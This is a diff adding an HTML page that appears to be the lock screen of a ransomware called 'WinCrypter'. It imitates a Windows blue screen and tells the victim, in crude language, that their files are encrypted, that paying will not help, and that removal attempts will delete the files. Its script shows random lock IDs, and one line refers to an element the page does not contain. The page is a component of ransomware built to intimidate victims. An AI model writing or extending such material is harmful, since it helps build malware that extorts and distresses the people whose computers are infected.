@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Locked</title>
+    <style>
+        body { margin: 0; background: #0000aa; color: white; font-family: 'Lucida Console', monospace; }
+        .bsod { padding: 50px; }
+        h1 { font-size: 48px; margin: 0; }
+        .code { margin: 30px 0; font-size: 18px; }
+        .footer { position: fixed; bottom: 20px; width: 100%; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="bsod">
+        <h1>:(</h1>
+        <p>Your System Got Fucked By WinCrypter Do Not Reboot Your System</p>
+        <div class="code">
+            <p>You dont need to pay you cant decrypt your files not even if you pay</p>
+            <p>If you try to remove the ransomware, your files will be permanently deleted.</p>
+            <p>Your files are encrypted by WinCrypter</p>
+        </div>  
+        <div class="footer">
+            <p>Made by IDK</p>
+            <p>Fucked By WinCrypter <span id="lockId"></span></p>
+        </div>
+    </div>
+    <script>
+        document.getElementById('randomCode').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
+        document.getElementById('lockId').innerText = 'LOCK-' + Math.random().toString(36).substring(2, 15).toUpperCase();
+    </script>
+</body>
+</html>
